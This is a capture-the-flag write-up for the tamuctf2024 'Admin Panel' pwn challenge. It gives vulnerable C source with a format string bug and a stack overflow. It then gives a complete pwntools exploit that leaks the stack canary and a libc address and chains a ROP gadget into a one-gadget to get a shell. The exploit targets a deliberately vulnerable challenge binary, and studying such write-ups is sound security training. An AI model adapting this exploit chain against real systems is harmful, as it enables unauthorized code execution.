# Admin Panel Writeup - Pwn - tamuctf2024

This challenge contains both a format string vulnerability and a buffer overflow. We can exploit these to leak addresses, retrieve the canary, and then use a one-gadget to gain a shell and retrieve the flag.

## Source Code
```c
#include <stdio.h>
#include <string.h>

int upkeep() {
	// IGNORE THIS
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

int admin() {
	int choice = 0;
	char report[64];

	puts("\nWelcome to the administrator panel!\n");
	puts("Here are your options:");
	puts("1. Display current status report");
	puts("2. Submit error report");
	puts("3: Perform cloning (currently disabled)\n");

	puts("Enter either 1, 2 or 3: ");
	scanf("%d", &choice);

	printf("You picked: %d\n\n", choice);

	if (choice == 1) {
		puts("Status report: \n");
		
		puts("\tAdministrator panel functioning as expected.");
		puts("\tSome people have told me that my code is insecure, but");
		puts("\tfortunately, the panel has many standard security measures implemented");
		puts("\tto make up for that fact.\n");

		puts("\tCurrently working on implementing cloning functionality,");
		puts("\tthough it may be somewhat difficult (I am not a competent programmer).");
	}
	else if (choice == 2) {
		puts("Enter information on what went wrong:");
		scanf("%128s", report);
		puts("Report submitted!");
	}
	else if (choice == 3) {
		// NOTE: Too dangerous in the wrong hands, very spooky indeed
		puts("Sorry, this functionality has not been thoroughly tested yet! Try again later.");
		return 0;

		clone();
	}
	else {
		puts("Invalid option!");
	}
}

int main() {
	upkeep();

	char username[16];
	char password[24];
	char status[24] = "Login Successful!\n";

	puts("Secure Login:");
	puts("Enter username of length 16:");
	scanf("%16s", username);
	puts("Enter password of length 24:");
	scanf("%44s", password);
	printf("Username entered: %s\n", username);
	if (strncmp(username, "admin", 5) != 0 || strncmp(password, "secretpass123", 13) != 0) {
		strcpy(status, "Login failed!\n");
		printf(status);
		printf("\nAccess denied to admin panel.\n");
		printf("Exiting...\n");
		return 0;
	}
	
	printf(status);
	admin();

	printf("\nExiting...\n");
}
```

We can see that the `password` input allows up to 44 bytes, even though the actual password length is only 24 bytes. This can be exploited to leak addresses from the runtime, and by subtracting these from known libc addresses, we can obtain the `libc_base`.

In the `admin` function, there's also a buffer overflow vulnerability in the `report` input, which allows 128 bytes, but the buffer is only allocated 64 bytes.

### Steps to Capture the Flag:
1. Exploit the format string vulnerability to leak the address of `__libc_start_main` and the canary from the runtime.
2. Calculate the libc base by subtracting the leaked `__libc_start_main` address from the known offset in `libc.so.6`.
3. Find the address of a one-gadget, then overwrite the return address with `pop rax` to call the one-gadget.

## Solver Code
```python
from pwn import *
# context.log_level = "debug"
context.arch = "amd64"

p = process("localhost", 1337)

p.sendline(b"admin")

password = b"secretpass123"
sendpw = password.ljust(0x20, b"A") + b"%15$p%17$p"
print(sendpw)
p.sendline(password.ljust(0x20, b"A") + b"%15$p%17$p")

p.recvuntil(b"entered:")
p.recvline()
leak = p.recvlineS()
print(f'This is the leak: {leak}')
canary, __libc_start_main_ret = [int(x, 16) for x in leak.split("W")[0].split("0x")[1:]]
print(hex(canary))
print(hex(__libc_start_main_ret))
libc_base = __libc_start_main_ret - 0x2409b
p.sendline(b"2")
one_gadget = 0x4497f + libc_base
pop_rax = 0x000000000003a768 + libc_base
payload = b"A" * (0x50 - 0x8) + p64(canary) + p64(0) + p64(pop_rax) + p64(0) + p64(one_gadget)
test_payload = b"A" * (0x50 - 0x8) + p64(canary) + b"B" * 8 + b"C" * 8 + b"D" * 8 + b"E" * 8
print(len(test_payload))
print(len(payload))
p.sendline(payload)

p.interactive()
```

Thank you :))